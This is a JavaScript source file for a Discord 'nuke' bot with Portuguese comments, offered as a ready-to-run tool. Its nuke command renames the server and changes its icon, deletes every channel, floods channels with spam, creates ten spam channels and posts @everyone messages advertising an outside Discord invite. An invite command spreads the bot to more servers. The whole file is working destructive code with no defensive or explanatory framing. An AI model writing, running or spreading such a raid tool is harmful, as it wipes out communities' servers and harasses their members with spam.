require('dotenv').config();
const { Client, GatewayIntentBits, PermissionsBitField, EmbedBuilder } = require('discord.js');
const fs = require('fs');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

const TOKEN = process.env.TOKEN;
const PREFIX = 'P.';
let blacklist = [];

// **Carregar a Blacklist**
function loadBlacklist() {
  try {
    if (!fs.existsSync('./blacklist.json')) {
      console.log('🛑 Criando blacklist.json...');
      fs.writeFileSync('./blacklist.json', JSON.stringify({ blacklist: [] }, null, 2));
    }

    const data = fs.readFileSync('./blacklist.json', 'utf8');
    const parsedData = JSON.parse(data);

    if (!parsedData.blacklist || !Array.isArray(parsedData.blacklist)) {
      console.log('⚠️ Blacklist corrompida, resetando...');
      blacklist = [];
      saveBlacklist();
    } else {
      blacklist = parsedData.blacklist;
    }
  } catch (err) {
    console.error('❌ Erro ao carregar a blacklist:', err);
    blacklist = [];
  }
}

// **Salvar Blacklist**
function saveBlacklist() {
  fs.writeFileSync('./blacklist.json', JSON.stringify({ blacklist }, null, 2));
}

client.once('ready', () => {
  loadBlacklist();
  console.log('✅ Bot online!');
});

client.on('messageCreate', async (message) => {
  if (!message.content.startsWith(PREFIX) || message.author.bot) return;

  const args = message.content.slice(PREFIX.length).trim().split(/ +/);
  const command = args.shift().toLowerCase();

  // **Prevenir usuários da blacklist**
  if (blacklist.includes(message.author.id)) {
    return message.reply('❌ Você está na blacklist e não pode interagir com o bot.');
  }

  // **Comando de Nuke**
  if (command === 'nuke') {
    if (!message.guild) return;
    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return message.reply('❌ Você não tem permissão para usar este comando.');
    }

    const guild = message.guild;
    try {
      // **1️⃣ Alterar nome e ícone do servidor**
      await guild.setName('Servidor NUKED');
      console.log('✅ Nome do servidor alterado.');

      const newAvatar = 'https://example.com/nuked-avatar.png'; // Troque pela URL desejada
      await guild.setIcon(newAvatar);
      console.log('✅ Foto do servidor alterada.');

      // **2️⃣ Apagar todos os canais**
      await Promise.all(
        guild.channels.cache.map(async (channel) => {
          try {
            await channel.delete();
            console.log(`✅ Canal '${channel.name}' apagado.`);
          } catch (error) {
            console.log(`❌ Erro ao apagar '${channel.name}', enviando spam...`);
            for (let j = 0; j < 10; j++) {
              channel.send(`💥 **Nuke ativado!**`).catch(() => {});
            }
          }
        })
      );

      // **3️⃣ Criar canais para spam**
      const spamMessages = Array(10).fill('🚀 **Nuke ativado!**');
      await Promise.all(
        Array(10).fill().map(async (_, i) => {
          try {
            const newChannel = await guild.channels.create({
              name: `pakistan own`,
              type: 0
            });

            await Promise.all(spamMessages.map(msg => newChannel.send(msg).catch(() => {})));
            console.log(`✅ Canal '${newChannel.name}' criado.`);
          } catch (err) {
            console.error('❌ Erro ao criar canal:', err);
          }
        })
      );

      await message.reply('
# ПАКИСТАН НА ВЕРХУ
# ||PAKISTAN NÃO TA PURO||
# NOS NO TOPO O RESTO É RANDOM
# https://discord.gg/7CadnxeryD
# @here @everyone');
    } catch (error) {
      console.error('❌ Erro no nuke:', error);
    }
  }

  // **Comando de Blacklist**
  if (command === 'blacklist') {
    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return message.reply('❌ Você não tem permissão para usar este comando.');
    }

    const target = message.mentions.users.first();
    if (!target) {
      return message.reply('❌ Mencione um usuário para adicionar à blacklist.');
    }

    if (blacklist.includes(target.id)) {
      return message.reply('❌ Este usuário já está na blacklist.');
    }

    blacklist.push(target.id);
    saveBlacklist();
    message.reply(`✅ O usuário ${target.tag} foi adicionado à blacklist.`);
  }

  // **Comando de Invite**
  if (command === 'invite') {
    const embed = new EmbedBuilder()
      .setTitle('👑 Convite para o servidor')
      .setDescription('Clique [aqui](https://discord.com/oauth2/authorize?client_id=SEU_CLIENT_ID&scope=bot&permissions=BOT_PERMISSIONS) para adicionar o bot ao seu servidor!')
      .setColor(0x3498db) // Azul em hexadecimal
      .setFooter({ text: 'Nuke Bot', iconURL: client.user.displayAvatarURL() });

    message.reply({ embeds: [embed] });
  }
});

client.login(TOKEN);
